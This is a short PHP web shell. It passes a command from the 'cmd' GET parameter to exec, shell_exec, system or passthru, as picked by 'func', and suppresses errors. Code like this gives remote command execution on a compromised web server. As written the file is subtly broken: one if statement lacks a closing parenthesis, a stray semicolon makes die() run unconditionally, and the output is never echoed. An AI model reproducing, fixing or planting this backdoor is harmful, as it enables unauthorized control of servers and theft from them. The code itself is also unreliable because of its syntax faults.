<?php
function do_phpfun($cmd,$fun) {
	$res = '';
	switch($fun){
		case "exec": 
			@exec($cmd,$res); 
			$res = join("\n",$res); 
			break;
		case "shell_exec": 
			$res = @shell_exec($cmd); 
			break;
		case "system": 
			@ob_start();	
			@system($cmd); 
			$res = @ob_get_contents();	
			@ob_end_clean();
			break;
		case "passthru": 
			@ob_start();	
			@passthru($cmd); 
			$res = @ob_get_contents();	
			@ob_end_clean();
			break;
	}
	return $res;
}

if (!isset($_GET['cmd'])
	die();

if (!isset($_GET['func']);
	die();
	
do_phpfun($_GET['cmd'], $_GET['func']);
exit;
?>